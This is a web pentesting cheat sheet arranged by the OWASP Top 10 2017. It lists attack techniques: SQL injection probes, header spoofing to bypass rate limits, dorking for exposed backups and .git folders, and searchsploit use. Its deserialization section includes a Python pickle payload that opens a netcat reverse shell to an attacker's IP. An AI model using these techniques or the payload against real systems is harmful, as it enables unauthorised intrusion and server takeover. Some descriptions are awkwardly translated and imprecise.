# OWASP 10 - 2017
##### TIP: Always test ALL params

## 1 - Injection

Injection flaws such as SQL, NoSQL, OS, or LDAP occur when data is sent that is not
to an interpreter, as part of a command or query. The attacker's harmful data
can trick the interpreter into executing inadvertent commands or accessing data without
proper authorization.

1) Manual: Always add ?url=' or email=test@example.com'&pass=123'.
2) Manual: In intruder add sqli.txt.
3) Manual: Test cookies, referrer and User-Agent.
4) Automation: Use "sqlmap" every params, for GET requests.
5) Automation: Use sqlmap -r request.txt, for POST and PUT requests.

## 2 - Broken Authentication

The functions of the application related to authentication and session management are
implemented incorrectly, allowing attackers to compromise users and
passwords, session tokens, or exploit other implementation flaws to assume the
identity of other users (temporarily or permanently).

1) Username enumeration via different responses
2) Enumeration error: "Incorrect password".
3) Ultimited requests + Weak password 
4) Request limit bypass via headers:
* X-Originating-IP: 127.0.0.1
* X-Forwarded-For: 127.0.0.1
* X-Remote-IP: 127.0.0.1
* X-Remote-Addr: 127.0.0.1
* X-Client-IP: 127.0.0.1
* X-Host: 127.0.0.1
* X-Forwared-Host: 127.0.0.1
5) Login successful reset request limit
6) Passwords in array: "password": []

## 3 - Sensitive Data Exposure

Many web applications and APIs do not adequately protect sensitive data, such as
financial, health, or Personally Identifiable Information (PII). the attackers
may steal or modify this inadequately protected data to carry out fraud
with credit cards, identity theft or other crimes. Sensitive data requires methods
additional protection, such as encryption in storage and transit.

1) Change value of params: string to number, boolean, etc.
2) /cgi-bin/phpinfo.php
3) /robots.txt + Dirsearch fuzzing backups.
4) Google dorks: EJP: ext:bak ext:sql ext:txt, https://pentest-tools.com/.
5) TRACE method enabled, example: 400 status or /admin - exposing header X-Custom-IP-Authorization
6) /.git + site:github.com inurl:$domain.com

## 4 - XML External Entities (XXE)

Many old or misconfigured XML processors evaluate entity references
external in XML documents. External entities can be used to reveal files
internal via URI or internal files on outdated servers, scan ports of
the LAN, execute code remotely, and perform denial-of-service (DoS) attacks.

Always test all params with:
https://github.com/AngelJuanMa/Web-Vulnerabilities/blob/main/Payloads/XXE.txt

## 5 - Broken Access Control

Restrictions on what authenticated users can do do not apply
correctly. Attackers can exploit these flaws to gain access, not
authorized, to functionalities and/or data, accounts of other users, view sensitive files,
modify data, change access rights and permissions, etc.

* Replace cookies or Authorization and remove credentials.  
* "roleid":1 to 2 or 0
* "admin": false to true
* X-Original-URL: /invalid = not found - X-Original-URL: /admin-panel
* Insecure direct object references - /?file=3.txt change to 2.txt

## 6 - Security Misconfiguration

Incorrect security configuration is a very common problem and is due in part to
set the configuration manually, ad hoc or by default (or directly due to the lack of
setting). Examples are: open S3 buckets, misconfigured HTTP headers, messages
error with sensitive content, lack of patches and updates, frameworks, dependencies and
outdated components, etc.

* S3 Buckets: Open Read, Open Upload.
* Open source - Search in github for default credentials.
* Detailed errors, test with other inputs example: /?status=1 to /?status="one".

## 7 - Cross-Site Scripting (XSS)

XSS occurs when an application takes untrusted data and sends it to the web browser
without proper validation and coding; or update an existing web page with data
supplied by the user using an API that executes JavaScript in the browser. Allow
execute commands in the victim's browser and the attacker can hijack a session,
modify (defacement) websites, or redirect the user to a malicious site.

https://github.com/AngelJuanMa/Pentesting/blob/main/XSS.md

## 8 - Insecure Deserialization

These flaws occur when an application receives malicious serialized objects and these objects
they can be manipulated or erased by the attacker to perform replay attacks,
injections or elevate their execution privileges. In the worst case, deserialization
insecure can lead to remote code execution on the server.

RCE via cookies desearilization with b64encode
```python
    import pickle
    import sys
    import base64
     
    command = 'rm /tmp/f; mkfifo /tmp/f | /bin/sh -i 2>&1 | netcat ip 4444 > /tmp/f'
     
    class rce(object):
    	def __reduce__(self):
    		import os
    		return (os.system,(command,))
     
    print(base64.b64encode(pickle.dumps(rce())))
```

## 9 - Using Components with Known Vulnerabilities

Components like libraries, frameworks and other modules run with the same
privileges than the application. If a vulnerable component is exploited, the attack can cause
a loss of data or take control of the server. The apps and APIs they use
components with known vulnerabilities can weaken application defenses and
allow various attacks and hits.

- Search: searchsploit hfs
- See code: searchsploit -x windows/remote/39161.py
- Install: searchsploit -m windows/remote/39161.py

1) Wpscan: wpscan --url https://
2) Shodan
3) Nmap
4) Burp suite
5) Nuclei -u domain
6) nikto -host domain
7) skipfish -o kit domain

## 10 - Insufficient Logging & Monitoring

Insufficient logging and monitoring, coupled with a lack of incident response, allow
attackers sustain the attack over time, pivot to other systems and manipulate, extract or
destroy data. Studies show that the detection time of a security breach is
greater than 200 days, typically being detected by third parties rather than internal processes.

> To know what to do and what is happening in the case of an attack.
* .log with = STATUS, IP, user, date and path.
* .log = 200 OK 49.99.13.16 user123 2019-03-21T21:07:35 /login

### References:
https://wiki.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf
